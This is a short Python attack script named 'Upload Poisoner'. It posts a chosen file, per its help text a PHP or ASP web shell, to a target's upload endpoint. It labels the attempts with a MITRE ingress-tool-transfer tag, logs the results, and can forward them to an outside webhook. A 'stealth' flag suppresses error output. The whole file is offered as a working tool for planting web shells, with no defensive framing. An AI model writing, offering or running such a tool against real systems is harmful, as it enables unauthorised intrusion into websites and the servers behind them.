import requests
import argparse
import os
import json
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1105"  # Ingress Tool Transfer

def log_result(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(existing, f, indent=2)

def poison_upload(target_url, file_path, stealth=False, webhook=None):
    try:
        with open(file_path, "rb") as f:
            files = {'file': (os.path.basename(file_path), f)}
            r = requests.post(target_url, files=files, timeout=10)
        result = {
            "timestamp": datetime.utcnow().isoformat(),
            "target": target_url,
            "type": "upload_poison",
            "file": os.path.basename(file_path),
            "status": r.status_code,
            "ttp": MITRE_TTP,
            "response_preview": r.text[:120]
        }
        print(f"[+] Upload attempt to {target_url} returned {r.status_code}")
        log_result(result)
        if webhook:
            try:
                requests.post(webhook, json=result, timeout=3)
            except Exception:
                if not stealth:
                    print("[!] Webhook delivery failed.")
    except Exception as e:
        if not stealth:
            print(f"[!] Upload failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Upload Poisoner - Exploits upload endpoints")
    parser.add_argument("--url", required=True, help="Upload endpoint URL")
    parser.add_argument("--file", required=True, help="File to upload (e.g., PHP/ASP shell)")
    parser.add_argument("--stealth", action="store_true", help="Suppress error output")
    parser.add_argument("--webhook", help="Webhook to send results")
    args = parser.parse_args()

    poison_upload(args.url, args.file, args.stealth, args.webhook)
